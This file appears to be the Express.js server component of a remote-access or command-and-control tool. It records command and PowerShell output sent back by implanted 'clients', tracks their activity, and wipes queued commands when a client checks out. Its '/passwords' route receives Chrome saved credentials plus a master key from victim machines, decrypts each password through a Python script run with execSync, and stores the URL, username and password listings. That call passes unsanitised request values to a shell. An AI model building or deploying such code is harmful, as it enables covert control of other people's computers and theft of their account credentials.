const router = require('express').Router();
const Response = require('../responses.model');
const psResponse = require('../psResponse.model');
const toolCookieValidator = require('../../Utils/MiddleWears/toolCookieValidator');
const {GenerateRandomId} = require("../../Utils/utilFunctions");
const Utils = require("../../Utils/utilFunctions");
const Client = require('../../Clients/client.model');
const Command = require("../../Commands/commands.model");
const path = require("path");
const child_process = require("child_process");
const appDir = path.dirname(require.main.filename);

//Validate cookie for incoming requests
router.use(toolCookieValidator);

//Powershell response
router.route('/ps').post((req, res) => {
    const response_id = GenerateRandomId(6);
    const clientId = req.headers['clientid'];
    const response = req.body.response;
    const newPsResponse = new psResponse({response_id: response_id, client_id: clientId, response: response});
    newPsResponse.save()
        .then(() => res.send())
        .catch(err => res.status(401).send());
});


//Regular command response
router.route('/').post((req, res) => {
    const response_id = GenerateRandomId(6);
    const clientId = req.headers.clientid;
    const response = req.body.response;
    const currentTimeDate = Utils.GetCurrentTimeDate();
    const newResponse = new Response({
        response_id: response_id,
        client_id: clientId,
        response: response,
        date: currentTimeDate
    });
    newResponse.save()
        .then(() => res.send())
        .catch(err => res.status(400).send());
    Client.findOneAndUpdate({client_id: clientId}, {lastActive: currentTimeDate}, {useFindAndModify: false},
        function (err) {
            if (err)
                Utils.LogToFile(`Error updating last active for client ${clientId}`);
        })
});

//tool checkout after exit
router.route('/checkout').get((req, res) => {
    try {
        const sessionKey = req.cookies['session_id'];
        const clientId = req.headers['clientid'];
        Client.findOneAndDelete({client_id: clientId, session_key: sessionKey}, {}, (err) => {
            if (err)
                Utils.LogToFile(`Error removing tool client after checkout ${err}`);
        });
        Command.find({}, (err, commands) => {
            if (err) {
                Utils.LogToFile(`Error fetching all client commands from db ${err}`);
            } else {
                if (commands.length !== 0) {
                    for (let i = 0; i < Object.keys(commands).length; i++) {
                        const commandId = commands[i]['command_id'];
                        Command.findOneAndDelete({command_id: commandId}, (err) => {
                            if (err)
                                Utils.LogToFile(`Error removing command from db for killed client${err}`);
                        })
                    }
                }
            }
        });
    } catch (err) {
        Utils.LogToFile(`Error removing tool client after checkout ${err}`);
    }

    res.send();
})


function generatePasswordData(data, masterKey) {
    let buffer = ""
    for (let object in data) {
        let url = data[object][0]['url']
        let username = data[object][1]['username']
        let password = data[object][2]['password']
        if (url && username && password) {
            buffer += `[+] Url: ${url}\n`
            buffer += `[+] Username: ${username}\n`
            let decryptedPass = child_process.execSync(`python ${appDir}\\scripts\\decrypt.py ${password} ${masterKey}`)
            buffer += `[+] Password: ${decryptedPass}\n`
        }
    }
    return buffer
}

//chrome passwords handle
router.post("/passwords", function (req, res) {
    let clientId = req.headers['clientid'];
    let data = req.body;
    let buffer;
    if (data.response)
        buffer = data.response
    else{
        let masterKey = req.body['masterKey'];
        buffer = generatePasswordData(data, masterKey)
    }
    try {
        const newResponse = new Response({
            response_id: GenerateRandomId(6),
            client_id: clientId,
            response: buffer,
            date: Utils.GetCurrentTimeDate()
        });
        newResponse.save()
            .then(() => res.send())
            .catch(err => {
                Utils.LogToFile(`Error adding passwords response: ${err.message}`)
                res.sendStatus(403)
            })
        Client.findOneAndUpdate({client_id: clientId}, {lastActive: Utils.GetCurrentTimeDate()}, {useFindAndModify: false},
            function (err) {
                if (err)
                    Utils.LogToFile(`Error updating last active for client ${clientId}`);
            })
    } catch (err) {
        Utils.LogToFile(`Error getting data from passwords request ${err}`);
        res.sendStatus(500)
    }
});

module.exports = router;